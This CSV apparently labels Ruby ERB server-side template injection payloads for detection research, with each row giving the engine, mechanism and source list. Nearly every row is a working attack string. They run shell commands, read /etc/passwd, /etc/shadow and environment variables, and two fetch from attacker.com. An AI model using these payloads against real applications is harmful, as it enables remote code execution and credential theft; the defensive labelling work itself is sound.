payload,base_id,language,engine,label,engine_confidence,mechanism,suspected_benign,review_notes,source_url
<%= 7*7 %>,<%=N*N%>,ruby,ERB,1,high,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= 7*'7' %>,<%=N*'S'%>,ruby,ERB,1,high,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""foo"" %>","<%=""S""%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""id"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= exec(""id"") %>","<%=exec(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{id} %>,<%=%x{id}%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""id"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.read(""/etc/passwd"") %>","<%=io.read(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""/etc/passwd"").read %>","<%=file.open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.read(""/etc/passwd"") %>","<%=file.read(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""/etc/passwd"",""r"").read %>","<%=file.open(""S"",""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""flag.txt"").read %>","<%=file.open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.read(""flag.txt"") %>","<%=file.read(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Dir.entries(""/"") %>","<%=dir.entries(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Dir.glob(""*"") %>","<%=dir.glob(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Dir.pwd %>,<%=dir.pwd%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Dir.chdir(""/tmp"") %>","<%=dir.chdir(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.binread(""/etc/passwd"") %>","<%=file.binread(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.readlines(""/etc/passwd"") %>","<%=file.readlines(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.foreach(""/etc/passwd"").read %>","<%=file.foreach(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.binread(""/etc/passwd"") %>","<%=io.binread(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.readlines(""/etc/passwd"") %>","<%=io.readlines(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.foreach(""/etc/passwd"").read %>","<%=io.foreach(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat /etc/passwd"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= exec(""cat /etc/passwd"") %>","<%=exec(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat /etc/passwd` %>,<%=`cat/etc/passwd`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{cat /etc/passwd} %>,<%=%x{cat/etc/passwd}%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""cat /etc/passwd"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""whoami"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `whoami` %>,<%=`whoami`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{whoami} %>,<%=%x{whoami}%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""whoami"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""ls -la"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `ls -la` %>,<%=`ls-la`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{ls -la} %>,<%=%x{ls-la}%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""ls -la"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""uname -a"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `uname -a` %>,<%=`uname-a`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{uname -a} %>,<%=%x{uname-a}%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""pwd"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""env"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV %>,<%=env%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV.to_h %>,<%=env.to_h%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ENV[""PATH""] %>","<%=env[""S""]%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ENV[""HOME""] %>","<%=env[""S""]%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ENV[""USER""] %>","<%=env[""S""]%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV.keys %>,<%=env.keys%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ENV.values %>,<%=env.values%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= RUBY_VERSION %>,<%=ruby_version%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= RUBY_PLATFORM %>,<%=ruby_platform%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= __FILE__ %>,<%=__file__%>,ruby,ERB,1,high,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= __LINE__ %>,<%=__line__%>,ruby,ERB,1,high,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= __dir__ %>,<%=__dir__%>,ruby,ERB,1,high,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self %>,<%=self%>,ruby,ERB,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self.class %>,<%=self.class%>,ruby,ERB,1,high,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self.methods %>,<%=self.methods%>,ruby,ERB,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= self.instance_variables %>,<%=self.instance_variables%>,ruby,ERB,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= ObjectSpace.each_object(Class).to_a %>,<%=objectspace.each_object(class).to_a%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Kernel %>,<%=kernel%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Kernel.methods %>,<%=kernel.methods%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.system(""id"") %>","<%=kernel.system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.exec(""id"") %>","<%=kernel.exec(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.`(""id"") %>","<%=kernel.`(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.spawn(""id"") %>","<%=kernel.spawn(""S"")%>",ruby,ERB,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.open(""|id"").read %>","<%=kernel.open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.eval(""system('id')"") %>","<%=kernel.eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""system('id')"") %>","<%=eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""`id`"") %>","<%=eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""File.read('/etc/passwd')"") %>","<%=eval(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""IO.popen('id').read"") %>","<%=eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Kernel.eval(""IO.popen('id').read"") %>","<%=kernel.eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= method(:system).call(""id"") %>","<%=method(:system).call(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= method(:exec).call(""id"") %>","<%=method(:exec).call(""S"")%>",ruby,ERB,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= method(:eval).call(""system('id')"") %>","<%=method(:eval).call(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(:system,""id"") %>","<%=send(:system,""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(:exec,""id"") %>","<%=send(:exec,""S"")%>",ruby,ERB,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(:eval,""system('id')"") %>","<%=send(:eval,""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= send(""`"",""id"") %>","<%=send(""S"",""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= public_send(:system,""id"") %>","<%=public_send(:system,""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= public_send(:eval,""system('id')"") %>","<%=public_send(:eval,""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= __send__(:system,""id"") %>","<%=__send__(:system,""S"")%>",ruby,ERB,1,high,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= __send__(:eval,""system('id')"") %>","<%=__send__(:eval,""S"")%>",ruby,ERB,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.capture2(""id"") %>","<%=openN.captureN(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.capture2e(""id"") %>","<%=openN.captureNe(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.capture3(""id"") %>","<%=openN.captureN(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Open3.popen3(""id"") %>","<%=openN.popenN(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Gem::GemRunner.new.run(%w(install a)) %>,<%=gem::gemrunner.new.run(%w(installa))%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= require 'open3'; Open3.capture2(""id"") %>","<%=require'S';openN.captureN(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= require 'open3'; Open3.capture2e(""id"") %>","<%=require'S';openN.captureNe(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= require 'open3'; Open3.capture3(""id"") %>","<%=require'S';openN.captureN(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= require 'open-uri'; open('http://attacker.com').read %>,<%=require'S';open('S').read%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= require 'net/http'; Net::HTTP.get(URI('http://attacker.com')) %>,<%=require'S';net::http.get(uri('S'))%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat flag.txt"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat flag.txt` %>,<%=`catflag.txt`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{cat flag.txt} %>,<%=%x{catflag.txt}%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""cat flag.txt"").read %>","<%=io.popen(""S"").read%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""ps aux"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `ps aux` %>,<%=`psaux`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""netstat -an"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `ifconfig` %>,<%=`ifconfig`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat /etc/shadow"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat /etc/shadow` %>,<%=`cat/etc/shadow`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.read(""/etc/shadow"") %>","<%=file.read(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|id"").read %>","<%=open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|cat /etc/passwd"").read %>","<%=open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|whoami"").read %>","<%=open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|ls -la"").read %>","<%=open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|uname -a"").read %>","<%=open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= open(""|pwd"").read %>","<%=open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
